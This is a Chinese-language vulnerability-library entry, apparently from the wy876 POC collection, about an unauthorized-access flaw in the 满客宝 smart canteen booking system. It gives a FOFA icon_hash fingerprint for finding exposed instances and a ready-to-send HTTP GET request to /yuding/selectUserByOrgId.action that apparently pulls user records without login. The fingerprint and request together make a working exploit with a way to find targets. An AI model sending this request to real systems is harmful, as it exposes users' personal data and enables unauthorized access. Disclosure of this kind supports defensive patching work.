---
fofa: "icon_hash="
source: "wy876 漏洞文库"
---

# 满客宝智慧食堂预定系统selectUserByOrgId 存在未授权访问漏洞

# 一、漏洞简介
满客宝智慧食堂预定系统selectUserByOrgId 存在未授权访问漏洞

# 二、影响版本
+ 满客宝智慧食堂预定系统

# 三、资产测绘
+ fofa`icon_hash="-409875651" `
+ 特征


# 四、漏洞复现
```java
GET /yuding/selectUserByOrgId.action?record= HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ikk2p8bp66933w1b>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
